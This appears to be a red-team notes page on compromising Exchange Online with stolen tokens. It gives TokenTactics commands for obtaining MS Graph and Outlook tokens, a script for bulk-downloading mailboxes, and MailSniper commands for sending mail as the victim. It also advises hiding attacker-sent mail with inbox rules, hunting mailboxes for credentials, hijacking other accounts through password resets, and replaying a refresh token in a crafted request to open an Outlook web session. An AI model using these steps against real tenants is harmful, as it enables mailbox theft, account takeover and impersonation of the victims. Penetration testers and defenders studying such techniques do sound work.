---
title: Exchange Online
---

> Under construction 🚧

Obtain an access token for MS Graph with [[notes/tools/tokentactics]].

~~~ powershell
RefreshTo-MSGraphToken -domain corp.com
echo $MSGraphToken.access_token
~~~

Download emails with [exfil_exchange_mail.py](https://github.com/rootsecdev/Azure-Red-Team/blob/master/Tokens/exfil_exchange_mail.py).

~~~ bash
python3 ./exfil_exchange_mail.py
~~~

Create an inbox rule to hide emails send as attacker.

Take over other services via "Password Forgotten".

Search for credentials in emails with [TeamFiltration](https://github.com/Flangvik/TeamFiltration).

Send an email via Exchange Online ([source](https://twitter.com/424f424f/status/1609552182390538245/)) with [[notes/tools/tokentactics]] and [MailSniper](https://github.com/dafthack/mailsniper).

~~~ powershell
Send-EWSEmail -ExchHostname substrate.office.com -Recipient jdoe@corp.com -Subject test -EmailBody 'Hello!' -AccessToken $token
~~~

MailSniper can be used as *Exchange Administrator* to read emails of all users.

To get an Outlook browser session obtain an access token for Outlook with [[notes/tools/tokentactics]].

~~~ powershell
RefreshTo-OutlookToken -domain corp.com
echo $OutlookToken.refresh_token
echo $OutlookToken.access_token
~~~

The open Burp, send the following request to [outlook.office.com](https://outlook.office.com) and open the response in your browser.

~~~ http
POST /owa/ HTTP/2
Host: outlook.office.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 2703
Referer: https://login.microsoftonline.com/
Origin: https://login.microsoftonline.com
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Te: trailers

code=REFRESH_TOKEN&id_token=ACCESS_TOKEN
~~~

Untested tools:

- [MsGraphFunzy](https://github.com/Mr-Un1k0d3r/MsGraphFunzy), download emails and attachments trough Microsoft Graph
- [Token Farm](https://github.com/rootsecdev/Azure-Red-Team/tree/master/Tokens), python scripts to access Outlook emails and OneDrive
